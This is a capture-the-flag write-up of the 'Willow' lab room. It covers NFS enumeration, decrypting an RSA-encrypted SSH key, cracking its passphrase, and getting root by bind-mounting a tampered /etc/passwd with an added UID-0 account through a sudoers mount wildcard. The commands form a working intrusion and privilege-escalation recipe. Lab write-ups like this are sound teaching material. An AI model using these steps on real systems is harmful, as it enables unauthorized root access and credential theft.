Willow is a room that rewards careful reading over brute force. There's no obvious exploit chain waiting to be scanned into existence — instead, an open NFS share and a page full of numbers on port 80 turn out to be two halves of the same puzzle. The privilege escalation path afterward is a good lesson in how a seemingly narrow sudoers rule can be turned into full root.

## Reconnaissance

A standard scan to see what's exposed:

```bash
rustscan -a <TARGET_IP>

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

Followed by a detailed nmap pass:

```bash
nmap -sS -sC -sV -O -Pn -p 22,80,111,2049 <TARGET_IP> -oN nmap.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     NFS 2,3,4
```

The NFS service on port 2049 and the RPC service that advertises it (111) stood out immediately — NFS shares are frequently left open with no authentication. The HTTP service, labeled "Recovery Page," was clearly worth a look too. SSH would need credentials I didn't have yet.

## NFS Enumeration

```bash
showmount -e <TARGET_IP>

Export list for <TARGET_IP>:
/var/failsafe *
```

`/var/failsafe` was exported to anyone. I mounted it:

```bash
mkdir /tmp/willow
sudo mount -t nfs <TARGET_IP>:/var/failsafe /tmp/willow
cat /tmp/willow/rsa_keys

Public Key Pair:  (23, 37627)
Private Key Pair: (61527, 37627)
```

An RSA key pair, sitting right there in the open share: `e=23`, `d=61527`, `n=37627`. That's not something you find every day — worth keeping close.

## The Ciphertext on Port 80

Visiting the web server showed a hex string. Decoding it with CyberChef's "From Hex" operation revealed:

```
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 ...  (~1765 numeric blocks)
```

A message and roughly 1765 numbers separated by spaces. Combined with the RSA parameters from the NFS share, this clicked immediately: each number is an RSA ciphertext block, encrypted character by character, decryptable with `m = c^d mod n`.

A quick sanity check on the first block:

```bash
python3 -c 'print(pow(2367, 61527, 37627))'

45
```

`chr(45)` is `-`, the start of a PEM header. Confirmed — this is an encrypted private key, one character at a time.

---

## Decrypting the Key

I wrote a small script to decrypt every block:

```python
d = 61527
n = 37627

def decrypt(blocks_text):
    blocks = blocks_text.split()
    chars = []
    for b in blocks:
        c = int(b)
        m = pow(c, d, n)
        chars.append(chr(m))
    return ''.join(chars)
```

```bash
python3 decrypt_rsa.py blocks.txt > id_rsa_willow.pem
chmod 600 id_rsa_willow.pem
```

The decrypted key was itself AES-128-CBC encrypted (`Proc-Type: 4,ENCRYPTED`, `DEK-Info: AES-128-CBC`) — a passphrase-protected private key, one layer deeper.

```bash
ssh2john id_rsa_willow.pem > willow_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt willow_hash.txt

wildflower (id_rsa_willow.pem)
```

`rockyou.txt` cracked it in seconds: `wildflower`. I stripped the passphrase to make the key easier to reuse:

```bash
ssh-keygen -p -f id_rsa_willow.pem
```

## Getting In

OpenSSH 6.7p1 dates from 2014 and only supports the older `ssh-rsa` algorithm, which modern OpenSSH clients disable by default. A quick flag fixes that:

```bash
ssh -i id_rsa_willow.pem -o PubkeyAcceptedAlgorithms=+ssh-rsa willow@<TARGET_IP>

willow@willow-tree:~$ id

uid=1000(willow) gid=1000(willow) groups=1000(willow)
```

I was in as `willow`. The room's user secret was hidden inside an image on the box, retrievable with OCR — a nice reminder that not everything worth finding is in a text file.

## Privilege Escalation: A Sudoers Wildcard and a Bind Mount

```bash
sudo -l

(ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

At first glance this looks tightly scoped — `mount`, restricted to devices under `/dev/`. But sudoers doesn't interpret `*` as a bash glob; it matches the entire command string against the pattern. As long as the full command starts with `/bin/mount /dev/`, any extra arguments after it are fair game.

I checked which device was actually the root filesystem, since `/etc/fstab` pointed at a device that didn't exist:

```bash
cat /proc/mounts | grep "/dev/"

/dev/xvda1 /              ext4    rw,relatime,errors=remount-ro    0 0
tmpfs      /dev/shm       tmpfs   rw,nosuid,nodev                  0 0
```

Two useful things here: the real root device (`/dev/xvda1`, not the `/dev/sda1` the fstab comment suggested), and `/dev/shm` — a `tmpfs` mount that's both world-writable and lives under `/dev/`, which means anything I create inside it matches the sudoers pattern.

Mounting the root disk normally, as expected, gave nothing extra — same user, same permissions, just a duplicated view of the same filesystem. The real value of `mount` here is `--bind`, which doesn't mount a new filesystem at all — it makes a file that already exists at one path also appear, transparently, at another.

```bash
cp /etc/passwd /dev/shm/passwd
```

I copied the real `/etc/passwd` rather than writing one from scratch, so the rest of the system's accounts stay intact.

```bash
openssl passwd -1 hacked

<HASH_GENERATED>
```

Then appended a new line with UID 0:

```bash
echo 'attacker:<HASH_GENERATED>:0:0:root:/root:/bin/bash' >> /dev/shm/passwd
```

The username doesn't matter at all — Linux identifies root by UID `0`, not by name. Adding a line rather than editing the existing root entry keeps the change additive.

```bash
sudo mount /dev/shm/passwd --bind /etc/passwd
```

This command is valid under the sudoers rule because it starts with `/dev/shm/passwd`, which itself starts with `/dev/`. The bind mount swaps the live `/etc/passwd` for my modified copy.

```bash
su attacker
Password: hacked

root@willow-tree:~# id

uid=0(root) gid=0(root) groups=0(root)
```

This gave me root through an account the system had never seen before.

## Post-Exploitation

`/root/root.txt` turned out to be a red herring — a note pointing back to the same image file from earlier, this time hinting at a second, hidden layer protected by a password I still needed to find.

That password showed up on a separate, hidden partition:

```bash
blkid

/dev/hidden_backup: LABEL="hidden_directory" UUID="33a55159-..." TYPE="ext4"

mkdir /tmp/hidden
mount /dev/hidden_backup /tmp/hidden
cat /tmp/hidden/creds.txt
```

With that password in hand, I went back to the image file from the SSH step and ran it through `steghide`:

```bash
steghide extract -sf user.jpg -p <PASSWORD>

wrote extracted data to "root.txt"
```

The image had been hiding a second layer the entire time — visible content on the surface, a steganographic payload underneath, unlocked only once I had both the file and the password from the hidden partition.

## Key Takeaways

**Sudoers wildcards match strings, not arguments** — a rule like `/bin/mount /dev/*` doesn't limit how many arguments follow; it only checks that the command starts with the allowed prefix. Anything appended after a matching prefix is permitted, which is exactly what made the bind mount possible.

**Bind mounts substitute files, not disks** — `mount --bind` doesn't need a block device at all. It makes any existing file appear at a second path, which is a clean way to swap out a system file like `/etc/passwd` without touching the disk it lives on.

**Identity is a number, not a name** — Linux doesn't care what a username says. UID `0` is root, full stop, regardless of whether the account is called `root`, `attacker`, or anything else.

**Layered secrets reward revisiting earlier files** — the image collected early in the room turned out to hold a second payload, only accessible once a later step supplied the missing password. Worth remembering before assuming a file has given up everything it has.
